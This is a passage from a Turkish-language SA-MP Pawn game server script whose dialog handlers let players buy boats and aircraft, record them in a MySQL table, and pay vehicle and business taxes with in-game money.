						    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
						    Arac[vehicleid][aposx] = 909.7927;
						    Arac[vehicleid][aposy] = -2130.8782;
						    Arac[vehicleid][aposz] = -0.3997;
						    Arac[vehicleid][afiyat] = 250000;
						    Arac[vehicleid][ahasar] = 1000.0;
						    Arac[vehicleid][alights] = 0;
						    Arac[vehicleid][abenzin] = 100.0;
						    Arac[vehicleid][apaintjob] = 99;
						    Arac[vehicleid][aspawn] = 1;
							Arac[vehicleid][akilittip] = 1;
							Arac[vehicleid][aimmo] = 1;
							Arac[vehicleid][aalarm] = 1;
							Arac[vehicleid][atip] = 1;
							Arac[vehicleid][abirlik] = 255;
							Arac[vehicleid][abenzintip] = 0;
							Arac[vehicleid][ahizsabit] = 0;
							Arac[vehicleid][akm] = 0;
							Arac[vehicleid][ametre] = 0;
							Arac[vehicleid][aisyeri] = 0;
							Arac[vehicleid][agelir] = 0;
							Aractamiri(vehicleid);
							new plakakyd[128];
			        		format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        		strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
							AracKaydet(vehicleid);

				 			LinkVehicleToInterior(vehicleid, 0);
							SetVehicleVirtualWorld(vehicleid, 0);
							SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
							SetVehicleToRespawn(vehicleid);
							if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

							GivePlayerCash(playerid, -250000);
							Bilgi(playerid, "Araç spawn oldu.");
						}
					}
				}
				case 1:
				{
				    if(IsPlayerConnected(playerid))
				    {
				    	if(GetPlayerCash(playerid) < 200000) return Hata(playerid, "Yeterli paranýz yok.");
				    	new query[1024];
						format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
			           	new Cache:cache = mysql_query(query,true);
			           	new new_vehicle_sql_id = cache_insert_id();
						cache_delete(cache);
						new vehicleid = CreateVehicle(452, 909.7927, -2130.8782, -0.3997, 0.0, 0, 0, -1, 0);

						if(IsValidVehicle(vehicleid))
						{
						    Arac[vehicleid][aid] = new_vehicle_sql_id;
						    Arac[vehicleid][amodel] = 452;
						    Arac[vehicleid][arenk1] = 0;
						    Arac[vehicleid][arenk2] = 0;
						    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
						    Arac[vehicleid][aposx] = 909.7927;
						    Arac[vehicleid][aposy] = -2130.8782;
						    Arac[vehicleid][aposz] = -0.3997;
						    Arac[vehicleid][afiyat] = 200000;
						    Arac[vehicleid][ahasar] = 1000.0;
						    Arac[vehicleid][alights] = 0;
						    Arac[vehicleid][abenzin] = 100.0;
						    Arac[vehicleid][apaintjob] = 99;
						    Arac[vehicleid][aspawn] = 1;
							Arac[vehicleid][akilittip] = 1;
							Arac[vehicleid][aimmo] = 1;
							Arac[vehicleid][aalarm] = 1;
							Arac[vehicleid][atip] = 1;
							Arac[vehicleid][abirlik] = 255;
							Arac[vehicleid][abenzintip] = 0;
							Arac[vehicleid][ahizsabit] = 0;
							new plakakyd[128];
			        		format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        		strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
							AracKaydet(vehicleid);

				 			LinkVehicleToInterior(vehicleid, 0);
							SetVehicleVirtualWorld(vehicleid, 0);
							SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
							SetVehicleToRespawn(vehicleid);
							if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

							GivePlayerCash(playerid, -200000);
							Bilgi(playerid, "Araç spawn oldu.");
						}
					}
				}
				case 2:
				{
				    if(IsPlayerConnected(playerid))
				    {
				    	if(GetPlayerCash(playerid) < 80000) return Hata(playerid, "Yeterli paranýz yok.");
				    	new query[1024];
						format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
			           	new Cache:cache = mysql_query(query,true);
			           	new new_vehicle_sql_id = cache_insert_id();
						cache_delete(cache);
						new vehicleid = CreateVehicle(453, 909.7927, -2130.8782, -0.3997, 0.0, 0, 0, -1, 0);

						if(IsValidVehicle(vehicleid))
						{
						    Arac[vehicleid][aid] = new_vehicle_sql_id;
						    Arac[vehicleid][amodel] = 453;
						    Arac[vehicleid][arenk1] = 0;
						    Arac[vehicleid][arenk2] = 0;
						    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
						    Arac[vehicleid][aposx] = 909.7927;
						    Arac[vehicleid][aposy] = -2130.8782;
						    Arac[vehicleid][aposz] = -0.3997;
						    Arac[vehicleid][afiyat] = 80000;
						    Arac[vehicleid][ahasar] = 1000.0;
						    Arac[vehicleid][alights] = 0;
						    Arac[vehicleid][abenzin] = 100.0;
						    Arac[vehicleid][apaintjob] = 99;
						    Arac[vehicleid][aspawn] = 1;
							Arac[vehicleid][akilittip] = 1;
							Arac[vehicleid][aimmo] = 1;
							Arac[vehicleid][aalarm] = 1;
							Arac[vehicleid][atip] = 1;
							Arac[vehicleid][abirlik] = 255;
							Arac[vehicleid][abenzintip] = 0;
							Arac[vehicleid][ahizsabit] = 0;
							new plakakyd[128];
			        		format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        		strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
							AracKaydet(vehicleid);

				 			LinkVehicleToInterior(vehicleid, 0);
							SetVehicleVirtualWorld(vehicleid, 0);
							SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
							SetVehicleToRespawn(vehicleid);
							if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

							GivePlayerCash(playerid, -80000);
							Bilgi(playerid, "Araç spawn oldu.");
						}
					}
				}
				case 3:
				{
				    if(IsPlayerConnected(playerid))
				    {
				    	if(GetPlayerCash(playerid) < 300000) return Hata(playerid, "Yeterli paranýz yok.");
				    	new query[1024];
						format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
			           	new Cache:cache = mysql_query(query,true);
			           	new new_vehicle_sql_id = cache_insert_id();
						cache_delete(cache);
						new vehicleid = CreateVehicle(454, 909.7927, -2130.8782, -0.3997, 0.0, 0, 0, -1, 0);

						if(IsValidVehicle(vehicleid))
						{
						    Arac[vehicleid][aid] = new_vehicle_sql_id;
						    Arac[vehicleid][amodel] = 454;
						    Arac[vehicleid][arenk1] = 0;
						    Arac[vehicleid][arenk2] = 0;
						    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
						    Arac[vehicleid][aposx] = 909.7927;
						    Arac[vehicleid][aposy] = -2130.8782;
						    Arac[vehicleid][aposz] = -0.3997;
						    Arac[vehicleid][afiyat] = 300000;
						    Arac[vehicleid][ahasar] = 1000.0;
						    Arac[vehicleid][alights] = 0;
						    Arac[vehicleid][abenzin] = 100.0;
						    Arac[vehicleid][apaintjob] = 99;
						    Arac[vehicleid][aspawn] = 1;
							Arac[vehicleid][akilittip] = 1;
							Arac[vehicleid][aimmo] = 1;
							Arac[vehicleid][aalarm] = 1;
							Arac[vehicleid][atip] = 1;
							Arac[vehicleid][abirlik] = 255;
							Arac[vehicleid][abenzintip] = 0;
							Arac[vehicleid][ahizsabit] = 0;
							new plakakyd[128];
			        		format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        		strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
							AracKaydet(vehicleid);

				 			LinkVehicleToInterior(vehicleid, 0);
							SetVehicleVirtualWorld(vehicleid, 0);
							SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
							SetVehicleToRespawn(vehicleid);
							if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

							GivePlayerCash(playerid, -300000);
							Bilgi(playerid, "Araç spawn oldu.");
						}
					}
				}
				case 4:
				{
				    if(IsPlayerConnected(playerid))
				    {
				    	if(GetPlayerCash(playerid) < 20000) return Hata(playerid, "Yeterli paranýz yok.");
				    	new query[1024];
						format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
			           	new Cache:cache = mysql_query(query,true);
			           	new new_vehicle_sql_id = cache_insert_id();
						cache_delete(cache);
						new vehicleid = CreateVehicle(473, 909.7927, -2130.8782, -0.3997, 0.0, 0, 0, -1, 0);

						if(IsValidVehicle(vehicleid))
						{
						    Arac[vehicleid][aid] = new_vehicle_sql_id;
						    Arac[vehicleid][amodel] = 473;
						    Arac[vehicleid][arenk1] = 0;
						    Arac[vehicleid][arenk2] = 0;
						    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
						    Arac[vehicleid][aposx] = 909.7927;
						    Arac[vehicleid][aposy] = -2130.8782;
						    Arac[vehicleid][aposz] = -0.3997;
						    Arac[vehicleid][afiyat] = 20000;
						    Arac[vehicleid][ahasar] = 1000.0;
						    Arac[vehicleid][alights] = 0;
						    Arac[vehicleid][abenzin] = 100.0;
						    Arac[vehicleid][apaintjob] = 99;
						    Arac[vehicleid][aspawn] = 1;
							Arac[vehicleid][akilittip] = 1;
							Arac[vehicleid][aimmo] = 1;
							Arac[vehicleid][aalarm] = 1;
							Arac[vehicleid][atip] = 1;
							Arac[vehicleid][abirlik] = 255;
							Arac[vehicleid][abenzintip] = 0;
							Arac[vehicleid][ahizsabit] = 0;
							new plakakyd[128];
			        		format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        		strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
							AracKaydet(vehicleid);

				 			LinkVehicleToInterior(vehicleid, 0);
							SetVehicleVirtualWorld(vehicleid, 0);
							SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
							SetVehicleToRespawn(vehicleid);
							if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

							GivePlayerCash(playerid, -20000);
							Bilgi(playerid, "Araç spawn oldu.");
						}
					}
				}
				case 5:
				{
				    if(IsPlayerConnected(playerid))
				    {
				    	if(GetPlayerCash(playerid) < 300000) return Hata(playerid, "Yeterli paranýz yok.");
				    	new query[1024];
						format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
			           	new Cache:cache = mysql_query(query,true);
			           	new new_vehicle_sql_id = cache_insert_id();
						cache_delete(cache);
						new vehicleid = CreateVehicle(484, 909.7927, -2130.8782, -0.3997, 0.0, 0, 0, -1, 0);

						if(IsValidVehicle(vehicleid))
						{
						    Arac[vehicleid][aid] = new_vehicle_sql_id;
						    Arac[vehicleid][amodel] = 484;
						    Arac[vehicleid][arenk1] = 0;
						    Arac[vehicleid][arenk2] = 0;
						    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
						    Arac[vehicleid][aposx] = 909.7927;
						    Arac[vehicleid][aposy] = -2130.8782;
						    Arac[vehicleid][aposz] = -0.3997;
						    Arac[vehicleid][afiyat] = 300000;
						    Arac[vehicleid][ahasar] = 1000.0;
						    Arac[vehicleid][alights] = 0;
						    Arac[vehicleid][abenzin] = 100.0;
						    Arac[vehicleid][apaintjob] = 99;
						    Arac[vehicleid][aspawn] = 1;
							Arac[vehicleid][akilittip] = 1;
							Arac[vehicleid][aimmo] = 1;
							Arac[vehicleid][aalarm] = 1;
							Arac[vehicleid][atip] = 1;
							Arac[vehicleid][abirlik] = 255;
							Arac[vehicleid][abenzintip] = 0;
							Arac[vehicleid][ahizsabit] = 0;
							new plakakyd[128];
			        		format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        		strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
							AracKaydet(vehicleid);

				 			LinkVehicleToInterior(vehicleid, 0);
							SetVehicleVirtualWorld(vehicleid, 0);
							SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
							SetVehicleToRespawn(vehicleid);
							if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

							GivePlayerCash(playerid, -300000);
							Bilgi(playerid, "Araç spawn oldu.");
						}
					}
				}
				case 6:
				{
				    if(IsPlayerConnected(playerid))
				    {
				    	if(GetPlayerCash(playerid) < 400000) return Hata(playerid, "Yeterli paranýz yok.");
				    	new query[1024];
						format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
			           	new Cache:cache = mysql_query(query,true);
			           	new new_vehicle_sql_id = cache_insert_id();
						cache_delete(cache);
						new vehicleid = CreateVehicle(493, 909.7927, -2130.8782, -0.3997, 0.0, 0, 0, -1, 0);

						if(IsValidVehicle(vehicleid))
						{
						    Arac[vehicleid][aid] = new_vehicle_sql_id;
						    Arac[vehicleid][amodel] = 493;
						    Arac[vehicleid][arenk1] = 0;
						    Arac[vehicleid][arenk2] = 0;
						    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
						    Arac[vehicleid][aposx] = 909.7927;
						    Arac[vehicleid][aposy] = -2130.8782;
						    Arac[vehicleid][aposz] = -0.3997;
						    Arac[vehicleid][afiyat] = 400000;
						    Arac[vehicleid][ahasar] = 1000.0;
						    Arac[vehicleid][alights] = 0;
						    Arac[vehicleid][abenzin] = 100.0;
						    Arac[vehicleid][apaintjob] = 99;
						    Arac[vehicleid][aspawn] = 1;
							Arac[vehicleid][akilittip] = 1;
							Arac[vehicleid][aimmo] = 1;
							Arac[vehicleid][aalarm] = 1;
							Arac[vehicleid][atip] = 1;
							Arac[vehicleid][abirlik] = 255;
							Arac[vehicleid][abenzintip] = 0;
							Arac[vehicleid][ahizsabit] = 0;
							new plakakyd[128];
			        		format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        		strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
							AracKaydet(vehicleid);

				 			LinkVehicleToInterior(vehicleid, 0);
							SetVehicleVirtualWorld(vehicleid, 0);
							SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
							SetVehicleToRespawn(vehicleid);
							if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

							GivePlayerCash(playerid, -400000);
							Bilgi(playerid, "Araç spawn oldu.");
						}
					}
				}
			}
	    }
	    return 1;
	}
	if(dialogid == 327)
	{
	    if(response)
	    {
			switch(listitem)
			{
				case 0:
				{
				    if(IsPlayerConnected(playerid))
				    {
				    	if(GetPlayerCash(playerid) < 250000) return Hata(playerid, "Yeterli paranýz yok.");
				    	new query[1024];
						format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
			           	new Cache:cache = mysql_query(query,true);
			           	new new_vehicle_sql_id = cache_insert_id();
						cache_delete(cache);
						new vehicleid = CreateVehicle(511, 909.7927, -2130.8782, -0.3997, 0.0, 0, 0, -1, 0);

						if(IsValidVehicle(vehicleid))
						{
						    Arac[vehicleid][aid] = new_vehicle_sql_id;
						    Arac[vehicleid][amodel] = 511;
						    Arac[vehicleid][arenk1] = 0;
						    Arac[vehicleid][arenk2] = 0;
						    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
						    Arac[vehicleid][aposx] = 909.7927;
						    Arac[vehicleid][aposy] = -2130.8782;
						    Arac[vehicleid][aposz] = -0.3997;
						    Arac[vehicleid][afiyat] = 250000;
						    Arac[vehicleid][ahasar] = 1000.0;
						    Arac[vehicleid][alights] = 0;
						    Arac[vehicleid][abenzin] = 100.0;
						    Arac[vehicleid][apaintjob] = 99;
						    Arac[vehicleid][aspawn] = 1;
							Arac[vehicleid][akilittip] = 1;
							Arac[vehicleid][aimmo] = 1;
							Arac[vehicleid][aalarm] = 1;
							Arac[vehicleid][atip] = 1;
							Arac[vehicleid][abirlik] = 255;
							Arac[vehicleid][abenzintip] = 0;
							Arac[vehicleid][ahizsabit] = 0;
							new plakakyd[128];
			        		format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        		strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
							AracKaydet(vehicleid);

				 			LinkVehicleToInterior(vehicleid, 0);
							SetVehicleVirtualWorld(vehicleid, 0);
							SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
							SetVehicleToRespawn(vehicleid);
							if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

							GivePlayerCash(playerid, -250000);
							Bilgi(playerid, "Araç spawn oldu.");
						}
					}
				}
				case 1:
				{
				    if(IsPlayerConnected(playerid))
				    {
				    	if(GetPlayerCash(playerid) < 225000) return Hata(playerid, "Yeterli paranýz yok.");
				    	new query[1024];
						format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
			           	new Cache:cache = mysql_query(query,true);
			           	new new_vehicle_sql_id = cache_insert_id();
						cache_delete(cache);
						new vehicleid = CreateVehicle(593, 909.7927, -2130.8782, -0.3997, 0.0, 0, 0, -1, 0);

						if(IsValidVehicle(vehicleid))
						{
						    Arac[vehicleid][aid] = new_vehicle_sql_id;
						    Arac[vehicleid][amodel] = 593;
						    Arac[vehicleid][arenk1] = 0;
						    Arac[vehicleid][arenk2] = 0;
						    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
						    Arac[vehicleid][aposx] = 909.7927;
						    Arac[vehicleid][aposy] = -2130.8782;
						    Arac[vehicleid][aposz] = -0.3997;
						    Arac[vehicleid][afiyat] = 225000;
						    Arac[vehicleid][ahasar] = 1000.0;
						    Arac[vehicleid][alights] = 0;
						    Arac[vehicleid][abenzin] = 100.0;
						    Arac[vehicleid][apaintjob] = 99;
						    Arac[vehicleid][aspawn] = 1;
							Arac[vehicleid][akilittip] = 1;
							Arac[vehicleid][aimmo] = 1;
							Arac[vehicleid][aalarm] = 1;
							Arac[vehicleid][atip] = 1;
							Arac[vehicleid][abirlik] = 255;
							Arac[vehicleid][abenzintip] = 0;
							Arac[vehicleid][ahizsabit] = 0;
							new plakakyd[128];
			        		format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        		strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
							AracKaydet(vehicleid);

				 			LinkVehicleToInterior(vehicleid, 0);
							SetVehicleVirtualWorld(vehicleid, 0);
							SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
							SetVehicleToRespawn(vehicleid);
							if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

							GivePlayerCash(playerid, -225000);
							Bilgi(playerid, "Araç spawn oldu.");
						}
					}
				}
				case 2:
				{
				    if(IsPlayerConnected(playerid))
				    {
				    	if(GetPlayerCash(playerid) < 750000) return Hata(playerid, "Yeterli paranýz yok.");
				    	new query[1024];
						format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
			           	new Cache:cache = mysql_query(query,true);
			           	new new_vehicle_sql_id = cache_insert_id();
						cache_delete(cache);
						new vehicleid = CreateVehicle(519, 909.7927, -2130.8782, -0.3997, 0.0, 0, 0, -1, 0);

						if(IsValidVehicle(vehicleid))
						{
						    Arac[vehicleid][aid] = new_vehicle_sql_id;
						    Arac[vehicleid][amodel] = 519;
						    Arac[vehicleid][arenk1] = 0;
						    Arac[vehicleid][arenk2] = 0;
						    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
						    Arac[vehicleid][aposx] = 909.7927;
						    Arac[vehicleid][aposy] = -2130.8782;
						    Arac[vehicleid][aposz] = -0.3997;
						    Arac[vehicleid][afiyat] = 750000;
						    Arac[vehicleid][ahasar] = 1000.0;
						    Arac[vehicleid][alights] = 0;
						    Arac[vehicleid][abenzin] = 100.0;
						    Arac[vehicleid][apaintjob] = 99;
						    Arac[vehicleid][aspawn] = 1;
							Arac[vehicleid][akilittip] = 1;
							Arac[vehicleid][aimmo] = 1;
							Arac[vehicleid][aalarm] = 1;
							Arac[vehicleid][atip] = 1;
							Arac[vehicleid][abirlik] = 255;
							Arac[vehicleid][abenzintip] = 0;
							Arac[vehicleid][ahizsabit] = 0;
							new plakakyd[128];
			        		format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        		strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
							AracKaydet(vehicleid);

				 			LinkVehicleToInterior(vehicleid, 0);
							SetVehicleVirtualWorld(vehicleid, 0);
							SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
							SetVehicleToRespawn(vehicleid);
							if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

							GivePlayerCash(playerid, -750000);
							Bilgi(playerid, "Araç spawn oldu.");
						}
					}
				}
				case 3:
				{
				    if(IsPlayerConnected(playerid))
				    {
				    	if(GetPlayerCash(playerid) < 250000) return Hata(playerid, "Yeterli paranýz yok.");
				    	new query[1024];
						format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
			           	new Cache:cache = mysql_query(query,true);
			           	new new_vehicle_sql_id = cache_insert_id();
						cache_delete(cache);
						new vehicleid = CreateVehicle(469, 909.7927, -2130.8782, -0.3997, 0.0, 0, 0, -1, 0);

						if(IsValidVehicle(vehicleid))
						{
						    Arac[vehicleid][aid] = new_vehicle_sql_id;
						    Arac[vehicleid][amodel] = 469;
						    Arac[vehicleid][arenk1] = 0;
						    Arac[vehicleid][arenk2] = 0;
						    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
						    Arac[vehicleid][aposx] = 909.7927;
						    Arac[vehicleid][aposy] = -2130.8782;
						    Arac[vehicleid][aposz] = -0.3997;
						    Arac[vehicleid][afiyat] = 250000;
						    Arac[vehicleid][ahasar] = 1000.0;
						    Arac[vehicleid][alights] = 0;
						    Arac[vehicleid][abenzin] = 100.0;
						    Arac[vehicleid][apaintjob] = 99;
						    Arac[vehicleid][aspawn] = 1;
							Arac[vehicleid][akilittip] = 1;
							Arac[vehicleid][aimmo] = 1;
							Arac[vehicleid][aalarm] = 1;
							Arac[vehicleid][atip] = 1;
							Arac[vehicleid][abirlik] = 255;
							Arac[vehicleid][abenzintip] = 0;
							Arac[vehicleid][ahizsabit] = 0;
							new plakakyd[128];
			        		format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        		strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
							AracKaydet(vehicleid);

				 			LinkVehicleToInterior(vehicleid, 0);
							SetVehicleVirtualWorld(vehicleid, 0);
							SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
							SetVehicleToRespawn(vehicleid);
							if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

							GivePlayerCash(playerid, -250000);
							Bilgi(playerid, "Araç spawn oldu.");
						}
					}
				}
				case 4:
				{
				    if(IsPlayerConnected(playerid))
				    {
				    	if(GetPlayerCash(playerid) < 300000) return Hata(playerid, "Yeterli paranýz yok.");
				    	new query[1024];
						format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
			           	new Cache:cache = mysql_query(query,true);
			           	new new_vehicle_sql_id = cache_insert_id();
						cache_delete(cache);
						new vehicleid = CreateVehicle(487, 909.7927, -2130.8782, -0.3997, 0.0, 0, 0, -1, 0);

						if(IsValidVehicle(vehicleid))
						{
						    Arac[vehicleid][aid] = new_vehicle_sql_id;
						    Arac[vehicleid][amodel] = 487;
						    Arac[vehicleid][arenk1] = 0;
						    Arac[vehicleid][arenk2] = 0;
						    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
						    Arac[vehicleid][aposx] = 909.7927;
						    Arac[vehicleid][aposy] = -2130.8782;
						    Arac[vehicleid][aposz] = -0.3997;
						    Arac[vehicleid][afiyat] = 300000;
						    Arac[vehicleid][ahasar] = 1000.0;
						    Arac[vehicleid][alights] = 0;
						    Arac[vehicleid][abenzin] = 100.0;
						    Arac[vehicleid][apaintjob] = 99;
						    Arac[vehicleid][aspawn] = 1;
							Arac[vehicleid][akilittip] = 1;
							Arac[vehicleid][aimmo] = 1;
							Arac[vehicleid][aalarm] = 1;
							Arac[vehicleid][atip] = 1;
							Arac[vehicleid][abirlik] = 255;
							Arac[vehicleid][abenzintip] = 0;
							Arac[vehicleid][ahizsabit] = 0;
							new plakakyd[128];
			        		format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        		strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
							AracKaydet(vehicleid);

				 			LinkVehicleToInterior(vehicleid, 0);
							SetVehicleVirtualWorld(vehicleid, 0);
							SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
							SetVehicleToRespawn(vehicleid);
							if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

							GivePlayerCash(playerid, -300000);
							Bilgi(playerid, "Araç spawn oldu.");
						}
					}
				}
			}
	    }
	    return 1;
	}
	if(dialogid == 328)
	{
	    if(response)
	    {
	        new _say=-1;
	        new mstring[128];
	        for(new i;i<MAX_VEHICLES;i++)
	        {
	            if(VergiOdeArac(playerid,i))
	            {
	                _say++;
					if(_say == listitem)
					{
					    format(mstring, sizeof(mstring), ""C2"ID:\t "C1"%d\n"C2"Model:\t "C1"%s\n"C2"Plaka:\t "C1"%s\n"C2"Vergi:\t %d"DOLAR"$"C1"",i,GetVehicleName(i),Arac[i][aplaka],Arac[i][vergi]);
                        if(Arac[i][vergi] > floatround(Arac[i][afiyat]/20)) format(mstring, sizeof(mstring), "%s\n\n"C4"(Araç vergi kilidinde bulunmaktadýr.)",mstring);
						ShowPlayerDialog(playerid, 329, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Banka", mstring, "Vergi Öde", "Ýptal");
						SetPVarInt(playerid, "VergiArac", i);
					    return 1;
					}
	            }
	        }
	    }
	    return 1;
	}
	if(dialogid == 8881)
	{
	    if(response)
	    {
	        new _say=-1;
	        new mstring[128];
	        foreach(new i : Business)
	        {
	            if(Isyeri[i][isahip] == Karakter[playerid][sqlid])
	            {
	                _say++;
					if(_say == listitem)
					{
					    format(mstring, sizeof(mstring), ""C2"ID:\t "C1"%d\n"C2"Vergi:\t %d"DOLAR"$"C1"",i,Isyeri[i][ivergi]);
                        if(Arac[i][vergi] >= floatround(Isyeri[i][ifiyat]*35/100)) format(mstring, sizeof(mstring), "%s\n\n"C4"(Ýþyeri vergi kilidinde bulunmaktadýr.)",mstring);
						ShowPlayerDialog(playerid, 8882, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Banka", mstring, "Vergi Öde", "Ýptal");
						SetPVarInt(playerid, "VergiIsyeri", i);
					    return 1;
					}
	            }
	        }
	    }
	    return 1;
	}
	if(dialogid == 8882)
	{
		if(response)
		{
		    new _vid=GetPVarInt(playerid, "VergiIsyeri");
		    if(GetPlayerCash(playerid) < Isyeri[_vid][ivergi]) return Hata(playerid, "Üzerinizde yeterli miktarda para yok.");
		    if(Isyeri[_vid][ivergi] == 0) return Hata(playerid, "Iþyeri üzerine vergi bulunmamaktadýr.");
			GivePlayerCash(playerid, -Isyeri[_vid][ivergi]);
			new mstring[1024];
			format(mstring, sizeof(mstring), "%d idli iþyerinin %d$ vergisini ödediniz.",_vid,Isyeri[_vid][ivergi]);
			Bilgi(playerid, mstring);
			Log(playerid, mstring);
			Isyeri[_vid][ivergi] = 0;
			IsyeriKaydet(_vid);
			IsyeriAyarla(_vid);
			format(mstring, sizeof(mstring), "");
   			foreach(new i : Business)
			{
				if(Isyeri[i][isahip] == Karakter[playerid][sqlid])
				{
				    format(mstring, sizeof(mstring), "%s%d\t%d\n",mstring,i,Isyeri[i][ivergi]);
				}
    		}
			format(mstring, sizeof(mstring), "ID\tVergi\n%s",mstring);
			ShowPlayerDialog(playerid, 8881, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Banka", mstring, "Vergi Öde", "Ýptal");
		}
		return 1;
	}
	if(dialogid == 329)
	{
		if(response)
		{
		    new _vid=GetPVarInt(playerid, "VergiArac");
		    if(GetPlayerCash(playerid) < Arac[_vid][vergi]) return Hata(playerid, "Üzerinizde yeterli miktarda para yok.");
		    if(Arac[_vid][vergi] == 0) return Hata(playerid, "Aracýn üzerine vergi bulunmamaktadýr.");
			GivePlayerCash(playerid, -Arac[_vid][vergi]);
			new mstring[1024];
			format(mstring, sizeof(mstring), "%d idli aracýn %d$ vergisini ödediniz.",_vid,Arac[_vid][vergi]);
			Bilgi(playerid, mstring);
			Log(playerid, mstring);
			Arac[_vid][vergi] = 0;
			AracKaydet(_vid);
			format(mstring, sizeof(mstring), "");
   			for(new i;i<MAX_VEHICLES;i++)
			{
				if(VergiOdeArac(playerid,i))
				{
				    format(mstring, sizeof(mstring), "%s%d\t%s\t%s\t%d\n",mstring,i,GetVehicleName(i),Arac[i][aplaka],Arac[i][vergi]);
				}
    		}
			format(mstring, sizeof(mstring), "ID\tModel\tPlaka\tVergi\n%s",mstring);
			ShowPlayerDialog(playerid, 328, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Banka", mstring, "Vergi Öde", "Ýptal");
		}
		return 1;
	}
	if(dialogid == 330)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            if(GetPVarInt(playerid, "SoygunSure") > 0) return Hata(playerid, "Soygun baþlamýþken oyuncu alýp çýkaramazsýnýz.");
	            new _kisi=1;
				if(Soygun[playerid][oyuncu2] != -1) _kisi++;
				if(Soygun[playerid][oyuncu3] != -1) _kisi++;
				if(Soygun[playerid][oyuncu4] != -1) _kisi++;
				if(Soygun[playerid][oyuncu5] != -1) _kisi++;
				if(_kisi == 5) return Hata(playerid, "Soyguna en fazla 5 kiþi katýlabilir.");
